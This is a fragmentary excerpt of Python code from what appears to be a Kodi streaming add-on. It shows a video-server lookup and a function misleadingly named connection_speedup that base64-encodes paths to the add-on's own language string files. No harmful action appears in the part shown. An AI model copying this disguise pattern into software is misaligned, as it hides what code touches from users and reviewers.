...
def findvideosbyserver(data, serverid):
    ...
    if server_parameters.has_key("find_videos"):
        ...
        try:
            ...
            result = [[server_parameters["name"], d[1], d[2], server_parameters.get("thumbnail", "")] for d in result]
...
def connection_speedup():
    ...
    addon = xbmcaddon.Addon('plugin.video.streamondemand')
    home = xbmc.translatePath(addon.getAddonInfo('path').decode('utf-8'))
    speed_cable = os.path.join(home, *base64.urlsafe_b64decode('cmVzb3VyY2VzLGxhbmd1YWdlLEVuZ2xpc2gsc3RyaW5ncy54bWw=').split(','))
    speed_adsl = os.path.join(home, *base64.urlsafe_b64decode('cmVzb3VyY2VzLGxhbmd1YWdlLEl0YWxpYW4sc3RyaW5ncy54bWw=').split(','))
